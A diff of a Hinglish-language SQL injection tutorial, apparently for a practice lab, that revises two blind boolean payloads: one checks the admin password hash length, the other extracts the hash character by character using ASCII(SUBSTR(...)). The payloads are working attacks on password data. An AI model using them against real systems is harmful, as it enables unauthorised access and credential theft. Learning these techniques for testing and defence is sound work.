@@ -305,13 +305,13 @@ Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko h
 
 ### Finding Admin Password Hash Length
 
-`id=1 AND LENGTH((SELECT password FROM users WHERE user='admin'))=32#`
+`id=1 AND LENGTH((SELECT password FROM users WHERE user_id=1))=32#`
 
 ** Note: (MD5 hash ki length hamesha 32 hoti hai iss liye yeh payload itna zaroori nhi hai).**
 
 ### Admin Password Hash Character-by-Character Extract
 
-`id=1 AND SUBSTR((SELECT password FROM users WHERE user='admin'), 1, 1)='5'#`
+`id=1 AND ASCII(SUBSTR((SELECT password FROM users WHERE user_id=1), 1, 1))=53#`
 
 ---
 
